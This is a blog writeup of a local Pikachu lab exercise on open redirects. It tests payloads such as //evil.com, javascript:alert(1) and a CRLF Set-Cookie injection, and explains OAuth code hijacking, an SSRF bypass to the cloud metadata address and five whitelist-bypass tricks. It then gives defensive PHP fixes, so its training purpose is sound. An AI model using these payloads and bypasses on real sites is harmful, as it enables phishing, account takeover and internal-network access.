---
layout: post
title: Pikachu - URL 重定向 Writeup（开放重定向的实战价值）
platform: pikachu
date: 2026-10-29 20:56:00 +0800
categories: CTF
---

Pikachu - URL 重定向 Writeup（开放重定向的实战价值）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：URL 重定向 → 不安全的 URL 跳转
- 地址：`http://localhost/pikachu/vul/urlredirect/urlredirect.php`
- 题型：Web
- 考点：**开放重定向（Open Redirect）**、域名白名单绕过

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\urlredirect\
    urlredirect.php   概述页（带漏洞的跳转入口）
    unsafere.php      跳转目标示例
```

**页面形态**：

```text
我想问一下,你到底是下面哪一种类型的人:

像春天的花一样的少年
像夏天的雨一样的少年
像秋天的风一样的少年          ← 这个有 ?url=unsafere.php
我就是我,放荡不羁的我          ← 这个有 ?url=i
```

**作者提示**：

```html
data-content="仔细看下每个请求的内容"
```

**★ 提示让你"看请求内容" —— 就是让你注意到 `url=` 这个参数。**

**✅ 实测结果（7 种 payload）**

| # | `url` 参数 | 结果 |
|---|---|---|
| 1 | `unsafere.php` | **302 → `unsafere.php`**（正常跳转）|
| 2 | `i` | 200，显示"好的,希望你能坚持做你自己!" |
| 3 | **`http://www.baidu.com`** | **302 → `http://www.baidu.com`** ✅ **开放重定向** |
| 4 | **`//evil.com`** | **302 → `//evil.com`** ✅ 协议相对也成 |
| 5 | **`javascript:alert(1)`** | **302 → `javascript:alert(1)`**（Location 头里带着）|
| 6 | `http://a.com\r\nSet-Cookie:hacked=1` | **200 + Warning**（PHP 挡住了换行）|
| 7 | `data:text/html,<script>alert(1)</script>` | **302 → `data:text/html,...`** |

二、题目分析

**① 漏洞代码：一行 header**

```php
<?php
// urlredirect.php 第 18-25 行
$html = "";
if(isset($_GET['url']) && $_GET['url'] != null){
    $url = $_GET['url'];
    if($url == 'i'){
        $html .= "<p>好的,希望你能坚持做你自己!</p>";
    }else {
        header("location:{$url}");        // ★ 直接跳转到用户给的 URL
    }
}
?>
```

**★ 页面上的四个链接**：

```html
<a href="urlredirect.php">像春天的花一样的少年</a>                    ← 没参数
<a href="urlredirect.php">像夏天的雨一样的少年</a>                    ← 没参数
<a href="urlredirect.php?url=unsafere.php">像秋天的风一样的少年</a>   ← 本站跳转
<a href="urlredirect.php?url=i">我就是我,放荡不羁的我</a>             ← 特殊值 i
```

**★ 只有第 3、4 个带 `url` 参数 —— 提示说的"看请求内容"就是这个。**

**② 什么是"开放重定向"**

**★ 定义**：

```
网站有一个"跳转功能"，跳转目标由 URL 参数决定
且【没有限制】只能跳到"白名单内的地址"
→ 任何人都能构造"跳到任意网站"的链接
★ 这叫开放重定向（Open Redirect）
```

**★ 本关就是标准写法**：

```php
header("location:" . $_GET['url']);      // ★ 用户想到哪就到哪
```

**★ 正常用途**（为什么会有这个功能）：

```
· 登录后跳回原页面：?redirect=/user/profile
· 短链接服务：?url=https://example.com
· 第三方登录回调：?return_url=...
· 广告点击统计：?target=...
```

**★ 漏洞点**：

```
"跳转目标"来自客户端，且"完全没校验"
→ 攻击者可以把 target 改成任意地址
```

**③ 为什么危险（很多人觉得"跳转而已，没什么"）**

**★ 这是本关最重要的部分 —— 开放重定向的"实战价值"。**

**危害 1：钓鱼（最常见）**

```
攻击者构造：
    https://trusted-bank.com/redirect?url=http://evil-bank.com
    
受害者看到的是：
    · 域名是 trusted-bank.com（可信）
    · 点了之后真的跳到"看起来一样的"钓鱼站
    
★ 因为"链接前缀可信"，受害者容易上当
★ 而很多"邮件网关/安全设备"只看"最终域名"的前缀
★ 钓鱼成功率大幅提升
```

**危害 2：OAuth / SSO 劫持（最严重）**

**★ OAuth 的典型流程**：

```
① 用户点"用 XX 登录"
② 跳到授权服务器：/authorize?client_id=xxx&redirect_uri=https://trusted.com/callback&state=...
③ 用户同意 → 授权服务器带着 code 跳回 redirect_uri
④ 客户端用 code 换 token
```

**★ 如果 redirect_uri 所在的站点有开放重定向**：

```
redirect_uri=https://trusted.com/redirect?url=http://evil.com
→ 授权服务器认为"跳回 trusted.com"（白名单内 ✅）
→ 但 trusted.com 又跳到了 evil.com
→ ★ code 泄露给了 evil.com
→ 攻击者用 code 换 token → 接管账号
```

**★ 这就是"OAuth 授权码劫持"的经典路径。**

**危害 3：绕过 SSRF 的白名单**

**★ 很多 SSRF 防护会做"域名白名单"**：

```php
$allowed = ['api.trusted.com', 'cdn.trusted.com'];
if (!in_array(parse_url($url, PHP_URL_HOST), $allowed)) {
    die('不许访问');
}
```

**★ 如果白名单里的域名有开放重定向**：

```
?url=https://api.trusted.com/redirect?url=http://169.254.169.254/
→ 白名单检查通过（api.trusted.com）
→ 但实际请求被"重定向"到了内网地址
→ ★ SSRF 防护被绕过
★ 很多 SSRF 漏洞就是靠"开放重定向"打进去的
```

**危害 4：窃取 Referer 里的敏感信息**

**★ 有些页面把敏感信息放在 URL 里**：

```
https://trusted.com/page?token=abc123
```

**★ 如果这个页面有开放重定向**：

```
点页面上的"跳转"链接 → 跳到 evil.com
→ 浏览器的 Referer 头会带上：
   Referer: https://trusted.com/page?token=abc123
→ ★ token 泄露给 evil.com
```

**危害 5：绕过"链接安全检测"**

**★ 很多 IM / 邮件系统会检测链接**：

```
· 检测"域名是否在黑名单"
· 检测"链接是否指向已知恶意站点"
```

**★ 用开放重定向可以绕过**：

```
https://trusted.com/redirect?url=http://evil.com
★ 检测系统看到的是 trusted.com（白名单）→ 放行
★ 用户点了之后才跳到 evil.com
```

**④ 为什么 CRLF 注入被挡住（一个"顺带"的知识点）**

**★ 测试**：

```
?url=http://a.com%0d%0aSet-Cookie:hacked=1
```

**★ 结果**：

```
Warning: header() has detected a new line in the header value
```

**★ 解释**：

```
PHP 5.1.2+ 起，header() 禁止"值里含换行"
→ 防止"HTTP 响应拆分"（CRLF Injection）
★ 所以现代 PHP 里"用 header 注入"基本不可能
★ 但如果是"手工拼接响应"（如 socket 编程 / 老版本 CGI）就还能打
```

**⑤ `javascript:` 和 `data:` 协议能不能打**

**★ 实测**：

```
?url=javascript:alert(1)   → 302, Location: javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>  → 302, Location: data:...
```

**★ 但浏览器行为**：

```
· 大多数现代浏览器：拒绝执行"Location 头里的 javascript:"
  ★ 因为"跳转到 javascript:"被认为是危险行为
· 老版本 IE / 某些场景：可能会执行
· data: 在"导航"场景：Chrome 2017 年起禁止
★ 所以这两个"理论上能打"，实际要看浏览器
```

**★ 一个"更实用"的方向是"钓鱼"（危害 1）**：

```
不需要执行 JS
只需要"把用户骗到钓鱼站"
★ 这个在所有浏览器上都成立
```

三、解题步骤

**第 1 步：看正常跳转**

```text
① 打开 http://localhost/pikachu/vul/urlredirect/urlredirect.php
② 点 "像秋天的风一样的少年"
③ URL 变成：urlredirect.php?url=unsafere.php
④ 页面跳到了 unsafere.php
```

**★ 提示"仔细看下每个请求的内容"**：

```
url 参数 = unsafere.php
★ 这个参数就是"跳转目标"
```

**第 2 步：⭐ 跳到外站（开放重定向）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
```

**★ 结果**：

```
浏览器直接跳到百度首页
```

**★ F12 网络面板验证**：

```
Request:  GET /urlredirect.php?url=http://www.baidu.com
Status:   302 Found
Location: http://www.baidu.com
```

**第 3 步：⭐ 试"协议相对"写法**

```
http://localhost/pikachu/vul/urlredirect/urlredirect.php?url=//www.baidu.com
```

**★ 也跳到百度。**

**★ 为什么这个写法重要？**

```
有些防护只检查"http://" 开头
→ 用 //www.baidu.com 就绕过了
★ 浏览器会把 // 当成"当前协议的相对地址"
   → 当前是 http → 变成 http://www.baidu.com
```

**第 4 步：试 javascript 伪协议**

```
http://localhost/pikachu/vul/urlredirect/urlredirect.php?url=javascript:alert(1)
```

**★ 结果**：

```
302 Found
Location: javascript:alert(1)
★ 但浏览器一般不会执行（现代浏览器拒绝）
```

**第 5 步：验证 CRLF 被挡**

```
http://localhost/pikachu/vul/urlredirect/urlredirect.php?url=http://a.com%0d%0aSet-Cookie:hacked=1
```

**★ 结果**：

```
Warning: header() has detected a new line in the header value
★ PHP 挡住了
```

**第 6 步：完整 payload 汇总**

```
// ========== 正常 ==========
?url=unsafere.php
?url=i

// ========== 开放重定向（标准）==========
?url=http://www.baidu.com
?url=https://www.baidu.com

// ========== 协议相对（绕简单白名单）==========
?url=//www.baidu.com

// ========== 伪协议（看浏览器）==========
?url=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>

// ========== CRLF 注入（现代 PHP 已被挡）==========
?url=http://a.com%0d%0aSet-Cookie:hacked=1
```

四、延伸知识

**① 域名白名单的五种绕过手法**

**★ 很多代码会做"白名单校验"，比如**：

```php
$host = parse_url($url, PHP_URL_HOST);
if (!in_array($host, ['trusted.com'])) {
    die('不许跳转');
}
```

**★ 五种常见绕过**：

**绕过 1：`@` 混淆**

```
http://trusted.com@evil.com/
└────────┬────────┘
  userinfo 部分    真正的主机
★ parse_url 的 host = evil.com（会拦住）
★ 但"人眼"看到的是 trusted.com → 钓鱼有效
★ 有些"正则匹配"会误判
```

**绕过 2：子域名**

```
http://trusted.com.evil.com/
★ 如果白名单是"包含 trusted.com"（strpos）
→ 就绕过了
★ 正确做法：精确匹配 host，或用"后缀匹配 + 点号"
```

**绕过 3：路径里带域名**

```
http://evil.com/trusted.com/
★ 正则若匹配"字符串里有 trusted.com" → 放过
```

**绕过 4：编码 / 大小写**

```
http://TRUSTED.COM/          → 大小写（host 不敏感）
http://trusted%2ecom/        → 编码点
http://trusted.com%00.evil.com/ → NUL 截断（老版本）
```

**绕过 5：跳转链（最实用）**

```
http://trusted.com/redirect?url=http://evil.com
★ 跳到"真的白名单域名"，再由它"二次跳转"
★ 这就是本关介绍的那招
```

**★ 结论**：

```
"白名单"如果写得不够严（用 strpos / 正则 / 只看前缀）
→ 都能被绕
★ 正确做法：解析 URL → 精确比较 host（或后缀匹配 + 点号边界）
```

**② 开放重定向 vs SSRF（容易混的一对）**

| | **开放重定向**（本关）| **SSRF** |
|---|---|---|
| 谁去请求 | **浏览器**（客户端）| **服务器**（服务端）|
| 影响 | 用户被导到恶意站 | 服务器访问内网服务 |
| 能看到响应吗 | 用户能看到 | 攻击者能从服务器拿响应 |
| 典型危害 | 钓鱼、OAuth 劫持 | 内网渗透、云元数据 |
| 修补 | URL 白名单 | 协议/域名白名单 |

**★ 但两者会"互相放大"**：

```
SSRF 的白名单 → 被"开放重定向"绕过 → 打到内网
★ 所以"开放重定向"单独看是"低危"
★ 但它在"漏洞链"里经常是关键一环
```

**③ 为什么"开放重定向"常被判"低危"**

**★ 很多 SRC / 众测平台把它定成"低危"甚至"忽略"**：

```
理由：
· 需要用户主动点击
· 不直接泄露数据
· 危害"间接"
```

**★ 但从"漏洞链"角度看，它很有价值**：

```
· OAuth 劫持（能接管账号）
· SSRF 白名单绕过（能进内网）
· 钓鱼（能骗到密码）
★ 所以很多"高质量报告"会把开放重定向和"实际危害"绑在一起写
```

**★ 一个写报告的建议**：

```
不要只写"能跳转到任意 URL"
要写"能用来做什么"
    · 配合 OAuth → 劫持授权码
    · 配合 SSRF → 绕过白名单
    · 配合钓鱼 → 提升可信度
★ 这样评级会高很多
```

**④ 真实的开放重定向案例**

**案例 1：Facebook OAuth 重定向劫持**

```
2013 年，某研究者在 Facebook 的 OAuth 流程里发现开放重定向
→ 能把授权码"劫持"到攻击者站点
→ 获得 $XX,XXX 赏金
```

**案例 2：Google 的开放重定向**

```
Google 的某些跳转服务（如 google.com/url?q=）历史上多次出现开放重定向
→ 被用于钓鱼
→ 后来加了"跳转确认页"
```

**案例 3：某银行 App 的"还款跳转"**

```
点"去还款" → 跳到合作方页面
→ 合作方页面有开放重定向
→ 被钓到假银行站
```

**案例 4：SSRF 白名单绕过**

```
某云服务的图片抓取功能（SSRF）
→ 白名单只允许"自家 CDN"
→ CDN 的某个跳转接口有开放重定向
→ ?url=https://cdn.xxx.com/redirect?url=http://169.254.169.254/
→ 拿到云主机临时凭证
```

**⑤ 防御（三层）**

**❌ 本关的反面教材**：

```php
$url = $_GET['url'];
header("location:{$url}");        // 想跳哪跳哪
```

**✅ 第 1 层：白名单（推荐）**

```php
$allowed = [
    '/user/profile',
    '/home',
    'https://trusted.com/about',
];

$url = $_GET['url'] ?? '/home';
if (!in_array($url, $allowed, true)) {
    $url = '/home';               // 不在白名单 → 回首页
}
header("Location: " . $url);
exit;
```

**★ 优点**：

```
· 只允许"预先写死的几个地址"
· 攻击者没有任何发挥空间
★ 这是最稳的方案
```

**✅ 第 2 层：只允许"相对路径"（很实用）**

```php
$url = $_GET['url'] ?? '/';

// 只允许"以 / 开头、且不以 // 或 /\ 开头"的相对路径
if (!preg_match('#^/(?![/*\\\\])#', $url)) {
    $url = '/';
}
header("Location: " . $url);
```

**★ 为什么这样写**：

```
· "/user/profile" → 合法（相对路径）
· "//evil.com"    → 拒绝（协议相对 → 会跳到外站）
· "/\evil.com"    → 拒绝（某些浏览器把 \ 当 /）
· "http://evil.com" → 拒绝（不是 / 开头）
★ 这样"绝对跳不到外站"
```

**✅ 第 3 层：跳转确认页（体验换安全）**

```html
<!-- 不直接 302，而是显示一个"确认页" -->
<h3>你即将离开本站</h3>
<p>目标地址：<code>http://www.baidu.com</code></p>
<a href="http://www.baidu.com" rel="noopener noreferrer nofollow">继续访问</a>
<a href="/">返回首页</a>
```

**★ 好处**：

```
· 用户能"看到"要去哪
· 钓鱼的成功率大幅下降
· 很多大厂（Google / 微信）都用这个
```

**★ 还要注意 `rel` 属性**：

```html
<a href="外部链接" rel="noopener noreferrer nofollow">
                      └───┬───┘ └──┬───┘ └──┬───┘
                   防 window.opener  防 Referer   告诉搜索引擎"别跟"
```

**⑥ 一个"检测开放重定向"的小技巧**

**★ 在页面上找"跳转类参数"**：

```
?url=   ?redirect=   ?return=   ?return_url=
?next=  ?target=     ?goto=     ?to=
?callback= ?continue= ?dest=    ?link=
```

**★ 测试方法**：

```
把值换成：
    http://www.baidu.com
    //www.baidu.com
    https://www.baidu.com
    javascript:alert(1)
★ 看响应头里有没有 302 + Location（指向你给的地址）
```

**★ 一个"批量测试"的思路**：

```
① 用爬虫把站点所有 URL 抓下来
② 筛选"参数名像跳转"的
③ 逐个替换成外部地址
④ 看是否有 302
★ 这就是"开放重定向"的自动化检测
```

五、总结

- **本题核心：`header("location:{$url}")` 直接使用用户输入的 URL → 可以跳到任意站点（开放重定向）。**

- **一行漏洞代码**：

```php
$url = $_GET['url'];
header("location:{$url}");        // ★ 零校验
```

- **⭐ 八个必记要点**：

```text
① 开放重定向 = "跳转目标由客户端决定，且不校验"
   本关：?url=http://www.baidu.com → 302 到百度

② 危害不在"跳转"本身，而在"漏洞链"
   · 钓鱼（链接前缀可信）
   · OAuth 授权码劫持（能接管账号）
   · 绕过 SSRF 的白名单（能进内网）
   · 窃取 Referer 里的 token
   · 绕过 IM/邮件的链接检测

③ 协议相对 `//evil.com` 是常用绕过
   有些防护只查 "http://" 开头 → 用 // 就绕过

④ CRLF 注入在 PHP 里基本不可能
   PHP 5.1.2+ 禁止 header() 里含换行
   ★ 报错：header() has detected a new line

⑤ javascript: / data: 能进 Location 头
   但现代浏览器拒绝执行
   ★ 所以"实际危害"主要是钓鱼，不是 XSS

⑥ 白名单的五种绕过
   @ 混淆 / 子域名 / 路径带域名 / 编码大小写 / 跳转链
   ★ 用 strpos 或正则做白名单 → 必被绕

⑦ 防御优先级
   白名单（最稳）> 只允许相对路径 > 跳转确认页
   ★ 相对路径的正则：^/(?![/*\\])

⑧ 写报告要"绑定危害"
   别只写"能跳外站"（会被判低危）
   要写"能配合 OAuth / SSRF 做什么"
```

- **实测数据**：

```text
?url=unsafere.php                → 302 → unsafere.php
?url=i                           → 200，显示"好的,希望你能坚持做你自己!"
?url=http://www.baidu.com        → 302 → http://www.baidu.com   ★ 开放重定向
?url=//evil.com                  → 302 → //evil.com             ★ 协议相对
?url=javascript:alert(1)         → 302 → javascript:alert(1)
?url=data:text/html,<script>...  → 302 → data:text/html,...
?url=http://a.com%0d%0aSet-Cookie:hacked=1
                                 → 200 + Warning（PHP 挡住换行）
```

- **进度**：

```text
platform: pikachu   41 篇（本地 107 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
├── XXE                 1/1    ✅
└── URL 重定向          1/1    ✅  ← 刚完成
```

**手工复现要点**：

```text
· 点 "像秋天的风一样的少年" → 跳 unsafere.php，URL 里 url=unsafere.php
· 改 url=http://www.baidu.com → 跳到百度
· 改 url=//www.baidu.com → 也跳
· 改 url=javascript:alert(1) → 302，Location 头带 javascript:
· 加 %0d%0a → 报 Warning（PHP 挡住）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  开放重定向 = "网站帮你跳到任意地方"                             │
│                                                            │
│  header("location:" . $_GET['url'])                        │
│      → ?url=http://www.baidu.com   （跳到百度）               │
│      → ?url=//evil.com             （协议相对绕过）            │
│                                                            │
│  单独看危害小，但在"漏洞链"里很关键：                            │
│      OAuth 授权码劫持  →  接管账号                             │
│      SSRF 白名单绕过   →  打进内网                             │
│      钓鱼（前缀可信）  →  骗密码                               │
│                                                            │
│  ★ CRLF 在 PHP 里被 header() 挡住                             │
│  ★ 防御：白名单（最稳）> 只允许相对路径 > 跳转确认页              │
└────────────────────────────────────────────────────────────┘
```
